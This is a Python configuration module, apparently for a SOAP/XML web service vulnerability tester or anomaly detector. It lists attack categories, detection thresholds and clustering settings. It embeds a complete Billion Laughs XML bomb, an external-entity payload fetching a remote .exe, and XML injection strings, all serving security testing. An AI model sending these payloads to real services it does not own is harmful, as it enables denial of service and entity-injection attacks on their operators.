ATTACK_NAMES = [
    ('XMLb', 'XML Bomb'),
    ('OVSXML', 'Oversized XML'),
    ('OVSPYLD', 'Oversized Payload'),
    ('SQLi', 'SQL Injection'),
    ('XMLi', 'XML Injection')
]

ATTACK_TYPES = [
    ('DoS', 'Denial Of Service'),
    ('Inj', 'Injection')
]

SQLI_TYPES = [
    ('Taut', 'Tautology'),
    ('Union', 'Union'),
    ('PiggyB', 'Piggy Backed'),
    ('IncQ', 'Illegal_logically incorrect queries')
]

XMLB_TYPES = [
    ('BIL', 'Billion Laughs'),
    ('ExtEnt', 'External Entity'),
    ('IntEnt', 'Internal Entity')
]

OVERSIZED_TYPES = [
    ('OverXML', 'Oversized XML'),
    ('OverPay', 'Oversized Payload')
]

OVERSIZED_XML_TYPES = [
    ('OverAttrContent', 'XML Oversized Attribute Content'),
    ('LongNames', 'XML Extra Long Names')
]

OVERSIZED_PAYLOAD_TYPES = [
    ('Header', 'SOAP Header'),
    ('Body', 'SOAP Body'),
    ('Envelope', 'SOAP Envelope')
]

XML_INJECTION_TYPES = [
    ('Malformed', 'Malformed'),
    ('Replicating', 'Replicating'),
    ('XPath', 'XPath')
]

XML_INJECTION_PATTERNS_TYPES = [
    ('Deforming', 'Deforming'),
    ('RandClosTags', 'Random Closing Tags'),
    ('SpecValues', 'Special Values'),
    ('NestedSQL', 'Nested SQL Injection'),
    ('NestedXPath', 'Nested XPath Injection'),
]

BILLION_LAUGHS = '''\
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''

XML_BOMB_EXTERNAL = '''\
<!DOCTYPE lolz [
    <!ENTITY loadui SYSTEM "http://downloads.sourceforge.net/project/loadui/1.0.1/loadUI-1_0_1.exe">
]>
<lolz>&loadui;</lolz>'''

OVERSIZED_CONTENT = '?????????<--Large contenu. Par défaut : 10^7 caractères-->?????????'

XML_INJECTION_META_CHARACTERS = ['<', '&', '>', '"', "'", '<!--', '-->', '<!-- <!--', '< [[', ']] >']

XML_INJECTION_SPECIAL_VALUES = ['True', 'False', 'Null', 'NaN', '-INF', '-Infinity', '+INF', '+Infinity']

XML_INJECTION_STRINGS_VALUES = ['String', 'Test', 'Value', '1', '25.00', 'Injection', 'XML Injection']

COMMON_VALUES = '"\'0\'"|"\'admin\'"|"\'passwd\'"|"\'2019\'"|"\'19022019\'"'

PATTERN_SEPARATORS = [' ', '.', '_', '-', '\\', '/']

IGNORE_WORDS = ['this', 'that', "that'll", 'these', 'those', 'am', 'is', 'are', 'was', 'were', 'be', 'been', 'being',
                'have', 'has', 'had', 'having', 'do', 'does', 'did', 'doing', 'a', 'an', 'the', 'of', 'at', 'then',
                'here', 'there', 'so', 'than', 'too', 'very', 's', 'i', 'me', 'my', 'myself', 'we', 'our', 'ours',
                'ourselves', 'you', "you're", "you've", "you'll", "you'd", 'your', 'yours', 'yourself', 'yourselves',
                'he', 'him', 'his', 'himself', 'she', "she's", 'her', 'hers', 'herself', 'it', "it's", 'its', 'itself',
                'they', 'them', 'their', 'theirs', 'themselves', 'what', 'which', 'who', 'whom']

HTTP_STATUS_CODES_SERVER_SIDE = [500, 501, 502, 503, 504, 505, 506, 507, 508, 510, 511]

DOS_HTTP_STATUS_CODES_SERVER_SIDE = [503, 504, 507, 509]

SIMILARITY_COEFFICIENT = 0.8

NUMBER_CLUSTERS = 8

NUMBER_DIMENSIONS = 4

NUMBER_NON_MALICIOUS_REQUESTS = 30

METHOD_CHOICE = {'preprocessing_method_1': ['cah']}

WORD_ORDER_THRESHOLD = 0.5

NUMBER_VALID_REQUESTS_DOS = 5

THRESHHOLD_1_DOS = 7

THRESHHOLD_2_DOS = 5

THRESHHOLD_3_DOS = 5

THRESHHOLD_4_DOS = 3

ANOMALY_THRESHOLD = 0.8

REQUEST_RESPONSE_SIMILARITY_THRESHOLD = 0.8